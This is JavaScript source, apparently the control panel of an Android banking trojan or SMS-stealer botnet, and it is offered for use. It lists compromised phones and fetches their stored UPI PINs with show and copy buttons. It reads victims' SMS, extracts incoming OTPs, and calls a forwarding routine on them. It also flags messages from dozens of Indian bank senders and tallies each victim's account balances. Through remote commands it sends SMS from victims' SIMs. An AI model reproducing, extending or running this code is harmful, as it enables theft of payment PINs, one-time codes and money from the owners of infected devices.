  document.getElementById('dmSub').textContent='#'+(d.deviceOrder||'—')+' · '+d.deviceId;
  var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
  var bp=isNaN(bv)?0:Math.min(100,Math.max(0,bv)),bd=isNaN(bv)?d.batteryRaw:bv+'%';
  document.getElementById('dmHero').innerHTML=
    '<div class="dm-hero-batt"><div class="dm-hero-batt-num" style="color:'+bc+'">'+bd+'</div><div class="dm-hero-batt-lbl">Battery</div></div>'
    +'<div class="dm-hero-batt-bar"><div class="dm-hero-batt-fill" style="width:'+bp+'%;background:'+bc+'"></div></div>'
    +'<div class="dm-hero-status">'
      +'<span style="background:'+(d.status?'rgba(6,214,160,.14)':'rgba(244,63,94,.1)')+';color:'+(d.status?'var(--mint)':'var(--rose)')+'">'+(d.status?'● ONLINE':'● OFFLINE')+'</span>'
      +(d.carrier&&d.carrier!=='—'?'<span style="background:rgba(56,189,248,.12);color:var(--sky)">📶 '+esc(d.carrier)+'</span>':'')
      +(d.smsSent?'<span style="background:rgba(168,85,247,.14);color:var(--gold2)">📤 '+d.smsSent+' SMS</span>':'')
      +(d.isRoot?'<span style="background:rgba(244,63,94,.14);color:var(--rose)">⚡ Root</span>':'')
      +(d.isSdCard?'<span style="background:rgba(6,214,160,.14);color:var(--mint)">💾 SD</span>':'')
    +'</div>';

  // ── SIM DISPLAY: slot 0 → SIM 1, slot 1 → SIM 2 ──
  var sim1=getSimBySlot(d,0);
  var sim2=getSimBySlot(d,1);
  var sim1Label=sim1?fmtPh(sim1.phoneNumber||''):'—';
  var sim2Label=sim2?fmtPh(sim2.phoneNumber||''):'—';
  document.getElementById('dmSim1').textContent=sim1Label;
  document.getElementById('dmSim2').textContent=sim2Label;

  var curSim=deviceSimMap[d.id]||1;
  document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){el.classList.toggle('active',parseInt(el.dataset.sim)===curSim);});
  document.querySelectorAll('#dmPane-send .stb').forEach(function(el,i){el.className='stb'+(i+1===curSim?(i+1===1?' s1':' s2'):'');});
  document.getElementById('dmNoteInp').value=noteC[d.id]||d.note||'';

  // ── INFO Grid ──
  var infoHtml=
    '<div class="ic"><div class="ic-l">Phone</div><div class="ic-v">'+esc(d.mobNo)+'</div></div>'
    +'<div class="ic"><div class="ic-l">Carrier</div><div class="ic-v">'+esc(d.carrier||'—')+'</div></div>'
    +'<div class="ic"><div class="ic-l">Device ID</div><div class="ic-v mono" style="font-size:10px;word-break:break-all">'+esc(d.deviceId)+'</div></div>'
    +'<div class="ic"><div class="ic-l">SMS Sent</div><div class="ic-v" style="color:var(--lilac)">'+d.smsSent+'</div></div>'
    +'<div class="ic"><div class="ic-l">IP Address</div><div class="ic-v mono">'+esc(d.ip||'—')+'</div></div>'
    +'<div class="ic"><div class="ic-l">Storage</div><div class="ic-v">'+esc(String(d.storage||'—'))+'</div></div>'
    +'<div class="ic"><div class="ic-l">Android</div><div class="ic-v">'+esc(d.android||'—')+'</div></div>'
    +'<div class="ic"><div class="ic-l">SDK</div><div class="ic-v">'+esc(String(d.sdkV||'—'))+'</div></div>'
    +'<div class="ic"><div class="ic-l">CPU</div><div class="ic-v">'+esc(d.cpuArch||'—')+'</div></div>'
    +'<div class="ic"><div class="ic-l">Joined</div><div class="ic-v" style="font-size:11px">'+esc(String(d.joined).slice(0,22))+'</div></div>'
    +'<div class="ic"><div class="ic-l">SD Card</div><div class="ic-v">'+(d.isSdCard?'✓ Yes':'✗ No')+'</div></div>'
    +'<div class="ic"><div class="ic-l">Rooted</div><div class="ic-v">'+(d.isRoot?'⚡ Yes':'✓ No')+'</div></div>';

  // SIM details block
  if(d.sims.length){
    infoHtml+='<div class="ic" style="grid-column:1/-1;background:rgba(56,189,248,.06);border-color:rgba(56,189,248,.2)">'
      +'<div class="ic-l">📱 SIM Details</div>';
    d.sims.forEach(function(s,idx){
      var slotNum=s.simSlotIndex;
      var displaySlot='SIM '+(slotNum+1); // slot 0 → SIM 1
      infoHtml+='<div style="font-size:11px;margin-top:6px;line-height:1.6"><span style="color:var(--gold2);font-weight:700">'+displaySlot+':</span> '+esc(fmtPh(s.phoneNumber||''))+' <span style="color:var(--sky)">'+esc(s.carrierName||'—')+'</span> <span style="color:var(--dim);font-size:9px">(slot '+slotNum+')</span></div>';
    });
    infoHtml+='</div>';
  }

  document.getElementById('dmInfo').innerHTML=infoHtml;
  document.getElementById('dmSendDisp').innerHTML='<div style="width:9px;height:9px;border-radius:50%;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 7px var(--mint)':'')+'"></div><div style="flex:1;min-width:0"><div class="dd-name">'+esc(d.name)+'</div><div class="dd-id">'+esc(d.deviceId)+'</div></div>';
  loadPinActive();
}

function dmSwitchTab(tab){
  document.querySelectorAll('.dm-tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab);});
  document.querySelectorAll('.dm-tab-pane').forEach(function(p){p.classList.remove('active');});
  document.getElementById('dmPane-'+tab).classList.add('active');
}
function setActiveSim(sim){if(!selDev)return;deviceSimMap[selDev.id]=sim;saveDeviceSims();refreshDeviceModal();toast('✓ SIM '+sim);}
function saveNoteActive(){if(!selDev)return;var v=document.getElementById('dmNoteInp').value.trim();fbSet('clients/'+selDev.id+'/note',v||null,selDev._fbUrl,selDev._fbKey).then(function(){noteC[selDev.id]=v;selDev.note=v;toast('📝 Saved');renderGrid();}).catch(function(){toast('⚠ Failed');});}
function confDelActive(){if(!selDev)return;document.getElementById('confT').textContent='Delete?';document.getElementById('confM').textContent='Delete "'+selDev.name+'"?';document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDel('clients/'+selDev.id,selDev._fbUrl,selDev._fbKey);toast('✓ Deleted');closeM('deviceModal');loadDevs();}catch(e){toast('⚠ Failed');}};openM('confirmModal');}

/* ═══════════ PIN ═══════════ */
async function getPin(id){
  var dev=allDevices.find(function(d){return d.id===id;});
  var u=dev&&dev._fbUrl||FB_URL,k=dev&&dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  try{var auth=k?'?auth='+k:'';var r=await fetch(u+'/clients/'+id+'/upipin.json'+auth,{signal:AbortSignal.timeout(6000)});var val=await r.json();
    if(val===null||val===undefined||val===false||val==='')return null;
    if(typeof val==='string'&&val.trim())return val.trim();
    if(typeof val==='number')return String(val);return null;
  }catch(e){return null;}
}
function preloadPins(devs){var tl=devs.filter(function(d){return d.status&&!d.upipin&&pinC[d.id]===undefined;}).slice(0,30);var i=0;function nx(){if(i>=tl.length)return;var d=tl[i++];getPin(d.id).then(function(p){pinC[d.id]=p;renderGrid();}).catch(function(){pinC[d.id]=null;});setTimeout(nx,300);}nx();}
async function loadPinActive(){
  if(!selDev)return;
  var pv=document.getElementById('dmPinVal'),pt=document.getElementById('dmPinToggle'),pcp=document.getElementById('dmPinCopy');
  if(!pv)return;
  var raw=selDev.upipin||pinC[selDev.id];
  if(!raw){raw=await getPin(selDev.id);pinC[selDev.id]=raw;}
  if(raw){pv.className='pin-digits blurred';pv.textContent=String(raw).split('|')[0].trim();pinV[selDev.id]=false;if(pt)pt.style.display='';pt.textContent='Show';if(pcp)pcp.style.display='';}
  else{pv.className='pin-digits loading';pv.textContent='No PIN in DB';}
}
function togPinActive(){if(!selDev)return;var id=selDev.id;pinV[id]=!pinV[id];var v=document.getElementById('dmPinVal'),b=document.getElementById('dmPinToggle');if(v)v.classList.toggle('blurred',!pinV[id]);if(b)b.textContent=pinV[id]?'Hide':'Show';}
function copyPinActive(){if(!selDev)return;var v=document.getElementById('dmPinVal');if(!v||v.classList.contains('loading'))return;clip(v.textContent,document.getElementById('dmPinCopy'));}

/* ═══════════ MESSAGES ═══════════ */
async function fetchMessagesForDevice(dev){
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  var auth=fbKey?'?auth='+fbKey+'&':'?';
  var paths=[
    fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200',
    fbUrl+'/clients/'+dev.id+'/messages.json'+auth+'orderBy="$key"&limitToLast=200',
    fbUrl+'/sms/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200'
  ];
  for(var i=0;i<paths.length;i++){
    try{var r=await fetch(paths[i],{signal:AbortSignal.timeout(8000)});if(!r.ok)continue;var data=await r.json();var msgs=parseMsgs(data);if(msgs.length)return msgs;}catch(e){}
  }
  return [];
}
function parseMsgs(data){
  var msgs=[];if(!data)return msgs;
  var entries=Array.isArray(data)?data.map(function(v,i){return[String(i),v];}):Object.entries(data);
  entries.forEach(function(kv){
    var k=kv[0],m=kv[1];if(m==null)return;
    var message='',sender='',dateTime='',type='incoming';
    if(typeof m==='string'){message=m;sender='Unknown';}
    else if(typeof m==='object'){
      message=m.message||m.body||m.text||m.msg||m.content||m.sms||m.messageText||'';
      var ps=m.sender||m.from||m.phoneNumber||m.phone||m.number||m.source||m.originator;
      var ads=m.address||m.originatingAddress||m.senderAddress;
      sender=String(ps||ads||'').trim();
      if(!sender||sender==='null'||sender==='undefined'||sender==='0')sender='';
      if(!sender){var ks=Object.keys(m);for(var ki=0;ki<ks.length;ki++){var kk=ks[ki],vv=String(m[kk]||'').trim();if(/^\+?\d{5,15}$/.test(vv)&&kk!=='type'){sender=vv;break;}}}
      if(!sender)sender='Unknown';
      dateTime=m.dateTime||m.date||m.time||m.timestamp||m.createdAt||m.receivedAt||m.sentAt||'';
      var rt=String(m.type||m.direction||m.msgType||'').toLowerCase();
      type=(rt==='2'||rt.indexOf('out')!==-1||rt.indexOf('sent')!==-1)?'outgoing':'incoming';
    }
    if(!message&&!sender)return;
    msgs.push({key:k,message:message||'(no body)',sender:sender,dateTime:dateTime,type:type,_ts:parseDT(dateTime)});
  });
  msgs.sort(function(a,b){if(a._ts>0&&b._ts>0)return b._ts-a._ts;return String(b.key).localeCompare(String(a.key));});
  return msgs;
}
async function preloadMsgs(id){
  if(!selDev)return;var ck=(selDev._fbId||'primary')+'|||'+id;
  try{var msgs=await fetchMessagesForDevice(selDev);_msgCache[ck]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(selDev&&selDev.id===id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();checkAndForward(msgs,id);updateDeviceBalanceFromMsgs(id,msgs);}
    startMP(id);
  }catch(e){startMP(id);}
}
async function pollMsgs(id){
  if(!selDev||selDev.id!==id)return;var ck=(selDev._fbId||'primary')+'|||'+id;
  try{var msgs=await fetchMessagesForDevice(selDev);var hasNew=msgs.some(function(m){return !lastKeys.has(m.key);});
    lastKeys=new Set(msgs.map(function(m){return m.key;}));_msgCache[ck]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(hasNew){allMsgs=msgs;updCnt();filterActiveMsgs();var lm=msgs[0];if(lm){var otp=_extractOtp(lm.message);if(otp&&otp!==_lastOtp)otpShow(otp,lm.sender);}checkAndForward(msgs,id);updateDeviceBalanceFromMsgs(id,msgs);}
    else if(allMsgs.length!==msgs.length){allMsgs=msgs;updCnt();filterActiveMsgs();}
  }catch(e){}
}
function _silentRefresh(dev){
  var ck=(dev._fbId||'primary')+'|||'+dev.id;
  fetchMessagesForDevice(dev).then(function(msgs){
    _msgCache[ck]=msgs;
    if(selDev&&selDev.id===dev.id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();}
    if(!forwardTracker[dev.id]&&msgs.length){forwardTracker[dev.id]=msgs[0].key;saveForwardTracker();}
    updateDeviceBalanceFromMsgs(dev.id,msgs);startMP(dev.id);
  }).catch(function(){startMP(dev.id);});
}
function updCnt(){var e=document.getElementById('dmMsgCnt');if(e)e.textContent=allMsgs.length+' msgs';}
function filterActiveMsgs(){
  var q=(document.getElementById('dmMsgSearch').value||'').toLowerCase();
  var list=allMsgs.filter(function(m){
    if(mfMode==='incoming'&&m.type!=='incoming')return false;
    if(mfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(q)return(m.message+m.sender).toLowerCase().indexOf(q)!==-1;
    return true;
  });
  var el=document.getElementById('dmMsgList');
  if(!list.length){el.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages found</p></div>';return;}
  el.innerHTML=list.map(function(m){
    var bankTag=detectBank(m.sender);
    return'<div class="msg-bub '+(m.type==='incoming'?'inc':'out')+'">'
      +'<div class="msg-meta"><span class="msg-sndr">'+esc(m.sender)+'</span>'+(bankTag?'<span class="msg-tp" style="background:rgba(168,85,247,.14);color:var(--gold2)">🏦 '+esc(bankTag.name)+'</span>':'')+'<span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime)+'</span></div>'
      +'<div class="msg-txt">'+esc(m.message)+'</div>'
      +'<button class="msg-del-btn" onclick="confirmDelMsg(\''+(selDev?esc(selDev.id):'')+'\',\''+esc(m.key)+'\',event,\''+esc((m.message||'').substring(0,60))+'\')">✕</button></div>';
  }).join('');
}
function setActiveMF(f){mfMode=f;['all','incoming','outgoing'].forEach(function(t){var e=document.getElementById('dm-mf-'+t);if(e)e.classList.toggle('ma',t===f);});filterActiveMsgs();}
async function refreshActiveMsgs(){if(!selDev)return;lastKeys=new Set();allMsgs=[];var msgs=await fetchMessagesForDevice(selDev);allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();}
function exportActiveMsgs(){if(!allMsgs.length){toast('⚠ No messages');return;}var csv='Sender,Type,DateTime,Message\n'+allMsgs.map(function(m){return[m.sender,m.type,m.dateTime,m.message].map(function(v){return'"'+String(v||'').replace(/"/g,'""')+'"';}).join(',');}).join('\n');_dlCsv('msgs-'+(selDev&&selDev.id||'dev')+'-'+Date.now()+'.csv',csv);}
function _dlCsv(name,rows){var a=document.createElement('a');a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(rows);a.download=name;a.click();}

var _delPendingDevId=null,_delPendingKey=null;
function confirmDelMsg(devId,key,evt,preview){if(evt)evt.stopPropagation();_delPendingDevId=devId;_delPendingKey=key;document.getElementById('delMsgPreview').textContent=preview||'(no preview)';document.getElementById('delMsgOk').onclick=doDelMsg;openM('delMsgModal');}
async function doDelMsg(){closeM('delMsgModal');if(!_delPendingDevId||!_delPendingKey)return;try{var dev=allDevices.find(function(d){return d.id===_delPendingDevId;});await fbDel('messages/'+_delPendingDevId+'/'+_delPendingKey,dev&&dev._fbUrl,dev&&dev._fbKey);toast('🗑 Deleted');}catch(e){toast('⚠ Failed');}_delPendingDevId=null;_delPendingKey=null;}

/* ═══════════ SEND SMS ═══════════ */
function updOtpNoteBox(){if(!selDev)return;var n=otpNoteC[selDev.id]||'';var d=document.getElementById('dmOtpNoteDisp'),i=document.getElementById('dmOtpNoteInp');if(d){d.textContent=n||'No OTP note saved…';d.className='otp-note-disp'+(n?'':' empty');}if(i)i.value=n;}
function saveOtpNoteActive(){if(!selDev)return;var v=document.getElementById('dmOtpNoteInp').value.trim();otpNoteC[selDev.id]=v;var d=document.getElementById('dmOtpNoteDisp');if(d){d.textContent=v||'No OTP note…';d.className='otp-note-disp'+(v?'':' empty');}toast('✓ Saved');}

async function sendSmsViaDevice(dev,sim,to,message,tag){
  if(!dev){console.error('[SMS] No device');return {ok:false,error:'no device'};}
  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/cmd.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
  var payload={message:message,sim:sim,to:to,ts:Date.now(),type:'sms'};
  console.log('[SMS]['+tag+'] → '+dev.name+' SIM'+sim+' → '+to);
  try{var r=await fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});if(!r.ok){console.error('[SMS]['+tag+'] ✗ HTTP '+r.status);return {ok:false,error:'HTTP '+r.status};}console.log('[SMS]['+tag+'] ✓ Queued');return {ok:true};}
  catch(e){console.error('[SMS]['+tag+'] ✗ '+e.message);return {ok:false,error:e.message};}
}
async function sendSmsActive(){
  if(!selDev){toast('⚠ No device');return;}
  var to=document.getElementById('dmSendTo').value.trim();
  var msg=document.getElementById('dmSendMsg').value.trim();
  if(!to||!msg){toast('⚠ Fill both fields');return;}
  var sim=deviceSimMap[selDev.id]||1;
  var btn=document.getElementById('dmSendBtn');btn.disabled=true;btn.textContent='Sending…';
  var res=await sendSmsViaDevice(selDev,sim,to,msg,'manual');
  if(res.ok){showResActive(true,'✓ Queued from SIM '+sim);document.getElementById('dmSendMsg').value='';document.getElementById('dmSendTo').value='';}
  else showResActive(false,'⚠ '+res.error);
  btn.disabled=false;btn.textContent='🚀 Send Message';
}
function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}

/* ═══════════ BANK DETECT ═══════════ */
var BANK_SENDERS = {
  'HDFCBK':'HDFC Bank','HDFC':'HDFC','SBIINB':'SBI','SBIMSG':'SBI','SBIUPI':'SBI','SBIBNK':'SBI',
  'ICICIB':'ICICI','ICICIM':'ICICI','AXISBK':'Axis','AXISB':'Axis','KOTAKB':'Kotak','KOTAK':'Kotak',
  'PNBSMS':'PNB','PNBBNK':'PNB','BOBSMS':'BOB','CANBNK':'Canara','UNIONB':'Union','IDBIBK':'IDBI',
  'YESBNK':'Yes Bank','INDUSB':'IndusInd','IDFCFB':'IDFC First','FEDERL':'Federal','RBLBNK':'RBL',
  'AUBANK':'AU Bank','BOIIND':'BOI','CENTBK':'Central','INDIANB':'Indian Bank','UCOBNK':'UCO',
  'PSBANK':'P&S','BANDHN':'Bandhan','DBSBNK':'DBS','CITIBN':'Citi','SCBANK':'Standard Chartered',
  'HSBCIN':'HSBC','AMEX':'Amex','IPBMSG':'India Post','UJJIVN':'Ujjivan','EQUITB':'Equitas',
  'PAYTMB':'Paytm','PHONEPE':'PhonePe','AIRTEL':'Airtel','JIOPB':'Jio Payments','FINO':'Fino',
  'BAJAJF':'Bajaj Finserv','BAJAJ':'Bajaj','TATACP':'Tata Capital','MUTHOT':'Muthoot',
  'CHOLAM':'Cholamandalam','SHRIRM':'Shriram','MANAPP':'Manappuram','MAHIND':'Mahindra',
  'CRED':'CRED','NAVI':'Navi','JUPITE':'Jupiter','PAYU':'PayU','RAZORP':'Razorpay',
  'CASHFRE':'Cashfree','LICIND':'LIC','CIBIL':'CIBIL'
};
var BANK_BAL_KEYWORDS = ['avl bal','avail bal','available bal','avbl bal','avlbal','ledger bal','closing bal','balance','bal:','bal -','bal is','bal rs','bal inr','bal ₹'];
var BANK_TXN_KEYWORDS = ['debited','credited','withdrawn','deposited','spent','transferred','txn','transaction','upi','imps','neft','rtgs'];
var BANK_PROMO_KEYWORDS = ['apply now','pre-approved','loan offer','click here','congratulations','winner','lucky','cashback offer','shop now','buy now','sale ends','limited time'];
function _normSender(s){if(!s)return'';s=String(s).toUpperCase();s=s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|XX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|JK|RK|IM|IP)-/,'');s=s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/,'');return s.replace(/[^A-Z0-9]/g,'');}
function detectBank(sender){var s=_normSender(sender);if(!s)return null;for(var k in BANK_SENDERS){if(s.indexOf(k)!==-1)return {name:BANK_SENDERS[k],key:k};}return null;}
function isBankingSms(sender,message){
  var bank=detectBank(sender);if(!bank)return null;
  var m=String(message||'').toLowerCase();
  var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(m.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
  var hasBal=false,hasTxn=false;
  for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(m.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}
  for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(m.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}
  var hasOtp=/\botp\b|one time password|verification code/i.test(m);
  if(isPromo&&!hasBal&&!hasTxn&&!hasOtp)return null;
  if(hasBal||hasTxn||hasOtp)return bank;
  return null;
}

/* ═══════════ BALANCES ═══════════ */
function extractBalancesFromMsgs(msgs){
  var banks={};
  var sorted=msgs.slice().sort(function(a,b){return a._ts-b._ts;});
  sorted.forEach(function(m){
    var txt=m.message||'',sender=m.sender||'';
    var bank=detectBank(sender);if(!bank)return;
    var lower=txt.toLowerCase();
    var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(lower.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
    var hasTxnOrBal=false;
    for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(lower.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxnOrBal=true;break;}}
    if(!hasTxnOrBal){for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(lower.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasTxnOrBal=true;break;}}}
    if(!hasTxnOrBal)return;
    if(isPromo&&!hasTxnOrBal)return;
    var acctM=txt.match(/[Aa]\/?[Cc]\.?\s*(?:[Nn][Oo]\.?)?\s*([NX*0-9]{4,})/);
    var acct=acctM?acctM[1].replace(/[NX*]/g,'').slice(-4):'';
    var key=bank.name+(acct?'-'+acct:'');
    var re=/(?:Rs\.?\s*|INR\.?\s*|\u20B9\s*)([0-9,]+(?:\.[0-9]{1,2})?)/gi,match,amts=[];
    while((match=re.exec(txt))!==null){var v=parseFloat(match[1].replace(/,/g,''));if(!isNaN(v)&&v>0)amts.push(v);}
    if(!amts.length)return;
    var isCr=/credited|received|deposited|refund/i.test(txt)&&!/debit/i.test(txt);
    var isDr=/debited|spent|withdrawn/i.test(txt)&&!/credit/i.test(txt);
    if(!isCr&&!isDr)return;
    if(!banks[key])banks[key]={bank:bank.name,acct:acct?'••'+acct:'',cr:0,dr:0,bal:null};
    var bk=banks[key];
    if(isCr)bk.cr+=amts[0];else bk.dr+=amts[0];
    var bp=[/Avl\.?\s*Bal\s*:?\s*(?:Rs\.?:?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/Balance\s*(?:is)?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/\bBal[\s:]+(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i];
    for(var p2=0;p2<bp.length;p2++){var bm=txt.match(bp[p2]);if(bm){var bv=parseFloat(bm[1].replace(/,/g,''));if(!isNaN(bv)){bk.bal=bv;break;}}}
  });
  return Object.keys(banks).map(function(k){return banks[k];}).sort(function(a,b){return(b.cr+b.dr)-(a.cr+a.dr);});
}
function updateDeviceBalanceFromMsgs(devId,msgs){
  var accs=extractBalancesFromMsgs(msgs);
  if(accs.length){balanceCache[devId]={accounts:accs,ts:Date.now()};setTimeout(renderGrid,100);}
}
async function refreshDeviceBalances(dev){
  if(!dev||!dev.status)return;
  try{var msgs=await fetchMessagesForDevice(dev);updateDeviceBalanceFromMsgs(dev.id,msgs);}catch(e){}
}
async function openBalances(){openM('balanceModal');await refreshBalances();}
async function refreshBalances(){
  var list=document.getElementById('balanceList');
  list.innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Fetching...</div>';
  var online=allDevices.filter(function(d){return d.status;});
  if(!online.length){list.innerHTML='<div class="bal-empty">📵 No online devices</div>';return;}
  await Promise.allSettled(online.map(async function(dev){
    try{var msgs=await fetchMessagesForDevice(dev);var accs=extractBalancesFromMsgs(msgs);if(accs.length)balanceCache[dev.id]={accounts:accs,ts:Date.now()};}catch(e){}
  }));
  renderBalances();renderGrid();
}

/* Open device from balance list */
function openDeviceFromBalance(devId){
  var d=allDevices.find(function(x){return x.id===devId;});
  if(!d){toast('⚠ Device not found');return;}
  closeM('balanceModal');
  document.body.style.overflow='';
  var uid=(d._fbId||'primary')+'|||'+d.id;
  setTimeout(function(){openDeviceModal(uid);},200);
}

function renderBalances(){
  var q=(document.getElementById('balSearch').value||'').toLowerCase();
  var list=document.getElementById('balanceList');
  var entries=allDevices.filter(function(d){return balanceCache[d.id];});
  if(q){
    entries=entries.filter(function(d){
      var hay=(d.name+' '+d.mobNo+' '+d.deviceId).toLowerCase();
      var accHay=(balanceCache[d.id].accounts||[]).map(function(a){return a.bank+' '+a.acct;}).join(' ').toLowerCase();
      return hay.indexOf(q)!==-1||accHay.indexOf(q)!==-1;
    });
  }
  if(!entries.length){list.innerHTML='<div class="bal-empty">No balances detected</div>';return;}
  var fmt=function(n){return'\u20B9'+Number(n||0).toLocaleString('en-IN',{maximumFractionDigits:2});};
  list.innerHTML=entries.map(function(d){
    var bal=balanceCache[d.id];var accs=bal.accounts||[];
    var stCls=d.status?'on':'off';var stTxt=d.status?'● ONLINE':'● OFFLINE';
    var tc=accs.reduce(function(s,a){return s+(a.cr||0);},0);
    var td=accs.reduce(function(s,a){return s+(a.dr||0);},0);
    var tb=accs.reduce(function(s,a){return s+(a.bal||0);},0);
    var accHtml=accs.map(function(a){
      var bCls=a.bal!=null?(a.bal>0?'':'zero'):'zero';
      var bTxt=a.bal!=null?fmt(a.bal):'--';
      return '<div class="bal-acc">'
        +'<div class="bal-acc-bank">🏦 '+esc(a.bank)+'</div>'
        +'<div class="bal-acc-acct">'+esc(a.acct||'')+'</div>'
        +'<div class="bal-acc-cr">+'+fmt(a.cr)+'</div>'
        +'<div class="bal-acc-dr">-'+fmt(a.dr)+'</div>'
        +'<div class="bal-acc-bal '+bCls+'">'+bTxt+'</div>'
        +'</div>';
    }).join('');
    return '<div class="bal-card" onclick="openDeviceFromBalance(\''+esc(d.id)+'\')" style="cursor:pointer">'
      +'<div class="bal-head">'
        +'<div class="bal-dev"><div class="bal-dev-name">'+esc(d.name)+'</div>'
        +'<div class="bal-dev-sub">'+esc(d.mobNo)+' · '+esc(String(d.deviceId).substring(0,12))+'…</div></div>'
        +'<div class="bal-dev-status '+stCls+'">'+stTxt+'</div>'
      +'</div>'
      +'<div class="bal-accounts">'+accHtml+'</div>'
      +'<div style="display:flex;gap:14px;margin-top:8px;font-size:11px;font-weight:700;padding-top:8px;border-top:1px dashed rgba(168,85,247,.15);flex-wrap:wrap;">'
        +'<span style="color:#a3e635">CR: '+fmt(tc)+'</span>'
        +'<span style="color:var(--rose)">DR: '+fmt(td)+'</span>'
        +'<span style="color:var(--gold2);margin-left:auto">BAL: '+fmt(tb)+'</span>'
      +'</div>'
      +'<div style="font-size:10px;color:var(--dim);text-align:right;margin-top:4px">👆 Tap to open device</div>'
      +'</div>';
  }).join('');
}

/* ═══════════ ALL MSGS ═══════════ */
function openAllMsgs(){openM('allMsgsModal');trigAM(false);startAP();}
function setAMF(f){amfMode=f;['all','incoming','outgoing'].forEach(function(t){var e=document.getElementById('amf-'+t);if(e)e.classList.toggle('ma',t===f);});filterAndRender();}
function trigAM(force){if(amLoading)return;if(!force&&amLoaded&&amAll.length){filterAndRender();return;}loadAllMsgs(force);}
async function loadAllMsgs(force){
  var online=allDevices.filter(function(d){return d.status;});
  if(!online.length){document.getElementById('amList').innerHTML='<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>';return;}
  amLoading=true;var now=Date.now();
  var toFetch=online.filter(function(d){return force||!amCache[d.id]||now-amFetch[d.id]>30000;});
  var BATCH=10;
  for(var i=0;i<toFetch.length;i+=BATCH){
    await Promise.allSettled(toFetch.slice(i,i+BATCH).map(async function(dev){try{amCache[dev.id]=await fetchMessagesForDevice(dev);amFetch[dev.id]=Date.now();}catch(e){if(!amCache[dev.id])amCache[dev.id]=[];}}));
    rebuild();filterAndRender();await new Promise(function(r){setTimeout(r,0);});
  }
  amLoaded=true;amLoading=false;rebuild();filterAndRender();
}
function rebuild(){
  var online=allDevices.filter(function(d){return d.status;});var c=[];
  for(var i=0;i<online.length;i++){
    var dev=online[i];var msgs=amCache[dev.id];if(!msgs||!msgs.length)continue;
    var note=noteC[dev.id]||dev.note||'';
    for(var j=0;j<msgs.length;j++){var m=msgs[j];c.push({key:m.key,message:m.message,sender:m.sender,_ts:m._ts,cn:i+1,did:dev.id,dname:dev.name,dnum:dev.mobNo,dnote:note,dateTime:m.dateTime,type:m.type});}
  }
  c.sort(function(a,b){return b._ts-a._ts;});amAll=c;
}
function filterAndRender(){
  var q=(document.getElementById('amSearch')||{}).value||'';q=q.toLowerCase();
  amFilt=amAll.filter(function(m){
    if(amfMode==='incoming'&&m.type!=='incoming')return false;
    if(amfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(q)return(m.message+m.sender+m.did+m.dname+m.dnum).toLowerCase().indexOf(q)!==-1;
    return true;
  });
  var list=document.getElementById('amList');list.innerHTML='';amCount=0;
  if(!amFilt.length){list.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';return;}
  renderPage();setupObs();
}
function renderPage(){
  var list=document.getElementById('amList');if(!list)return;
  var batch=amFilt.slice(amCount,amCount+AM);if(!batch.length)return;
  var frag=document.createDocumentFragment();
  batch.forEach(function(m){
    var el=document.createElement('div');el.className='am-card '+(m.type==='incoming'?'inc':'out');
    el.innerHTML='<div class="am-left"><div class="am-cn">#'+m.cn+'</div><div class="am-name">'+esc(m.dname)+'</div><div style="font-size:9px;color:var(--dim);font-family:\'JetBrains Mono\',monospace">'+esc(m.dnum||'')+'</div></div>'
